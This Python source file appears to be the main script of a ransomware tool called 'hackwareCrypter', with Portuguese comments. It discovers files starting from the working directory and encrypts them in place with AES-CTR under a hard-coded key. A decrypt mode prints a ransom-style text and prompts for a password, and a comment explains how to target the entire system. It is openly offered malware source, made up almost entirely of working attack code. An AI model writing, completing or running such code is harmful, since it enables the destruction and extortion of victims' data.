# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery as d
import Crypter as c
import texts
import getpass
_HARDCODED_KEY = 'hackware strike force strikes u!'


def get_parser():
    parser = argparse.ArgumentParser(description="hackwareCrypter")
    parser.add_argument(
        '-d', '--decrypt', help='decripta os arquivos [default: no]', action='store_true')
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print(texts._TEXT)
        key = input('Digite a seha > ')
    else:
        if _HARDCODED_KEY:
            key = _HARDCODED_KEY
    
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        cryptFn = crypt.encrypt
    else:
        cryptFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd()))
    #passar as pastas que vc quer ecryptar Ex: /home; /dev; /; quando passado somente a barra ele irá no sistema inteiro

    # vai listar as pastas fo /home/user_systma
    lista = os.listdir(f'/home/{getpass.getuser()}')

    startDir = [init_path]
    
    for currentDir in startDir:
        for fileName in d.discover(currentDir):
            c.change_files(fileName, cryptFn)

    # Limpa a chave de criptografia da memória
    for _ in range(100):
        pass

    if not decrypt:
        pass

if __name__ == "__main__":
    main()